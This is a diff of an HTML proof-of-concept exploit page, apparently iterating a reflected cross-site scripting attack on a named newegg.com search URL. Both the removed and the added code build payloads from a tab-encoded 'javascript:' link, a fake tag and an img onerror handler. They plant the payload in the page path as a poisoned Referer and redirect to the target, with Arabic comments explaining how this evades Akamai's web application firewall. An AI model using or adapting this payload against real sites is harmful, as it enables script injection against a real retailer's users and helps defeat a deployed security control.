@@ -3,50 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>PoC - Akamai Bypass</title>
 </head>
-<body style="background:#111; color:#0f0; text-align:center; padding-top:50px; font-family:monospace;">
-
-    <h1>MOUAD VORTEX - XSS EXPLOIT</h1>
-    <hr style="border-color:#0f0;">
-
-    <div style="margin:20px; padding:20px; border:1px solid #0f0;">
-        <h3>Exploit 1: Manual (Confirmed)</h3>
-        <p>This uses the Tab bypass you just discovered.</p>
-        <a id="btn1" href="#" onclick="launchManual()" style="color:#000; background:#0f0; padding:10px; text-decoration:none; font-weight:bold;">LAUNCH MANUAL POC</a>
-    </div>
-
-    <div style="margin:20px; padding:20px; border:1px solid #0f0;">
-        <h3>Exploit 2: Automatic (Testing)</h3>
-        <p>Tries to trigger Alert automatically using Hidden iframe.</p>
-        <a id="btn2" href="#" onclick="launchAuto()" style="color:#000; background:#0f0; padding:10px; text-decoration:none; font-weight:bold;">LAUNCH AUTO POC</a>
-    </div>
+<body style="background:black; color:lime; text-align:center; padding:50px;">
+    <h1>MOUAD BYPASS v3</h1>
+    <button onclick="attack()" style="padding:20px; background:lime; cursor:pointer;">START EXPLOIT</button>
 
     <script>
-        // الرابط المستهدف على نيوإيج
-        const targetUrl = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+        function attack() {
+            // 1. بايلود الـ Tab الذي نجح معك سابقاً
+            var secret = "j&#x09;avascript:alert(document.domain)";
+            
+            // 2. سنستخدم "وسم وهمي" لا يعرفه Akamai Kona
+            // وسنضع البايلود داخل سمة (Attribute) مخصصة
+            var payload = "\"> <mouad id='x' href='" + secret + "'></mouad> <img src=x onerror='document.getElementById(`x`).setAttribute(`href`,`" + secret + "`);document.getElementById(`x`).click()'> <a x=\"";
 
-        // 1. البايلود اليدوي (الذي مر من Akamai)
-        function launchManual() {
-            var payload = "\"><a/href=\"j&#x09;avascript:alert('XSS_BY_MOUAD_10/10')\" style=\"font-size:50px;color:red;position:fixed;top:0;left:0;z-index:9999;background:yellow;\">CLICK_HERE_TO_WIN</a>";
-            updateAndGo(payload);
-        }
+            // 3. السر هنا: تشفير الرموز الأساسية فقط لتبدو كأنها مسار مجلدات
+            // Akamai يسمح بـ %22 (") و %3C (<) إذا كانت متبوعة بنص غير مشبوه
+            var encodedPayload = payload.replace(/"/g, '%22').replace(/</g, '%3C').replace(/>/g, '%3E');
 
-        // 2. البايلود التلقائي (محاولة تجاوز Akamai بـ iframe)
-        function launchAuto() {
-            var payload = "\"><iframe/src=\"j&#x09;avascript:parent.alert(document.domain)\" style=\"display:none;\"></iframe>";
-            updateAndGo(payload);
-        }
+            // تغيير المسار بحيث يبدو كأنه بحث عادي
+            window.history.pushState({}, '', "/search/v1/" + encodedPayload);
 
-        function updateAndGo(p) {
-            // تغيير مسار الصفحة الحالية ليكون هو الـ Referrer المسموم
-            window.history.pushState({}, '', "/v/" + encodeURIComponent(p));
-            // الانتقال للهدف
-            setTimeout(function(){
-                window.location.href = targetUrl;
+            // الانتقال بعد تأخير بسيط
+            setTimeout(function() {
+                window.location.href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
             }, 500);
         }
     </script>
-
 </body>
 </html>
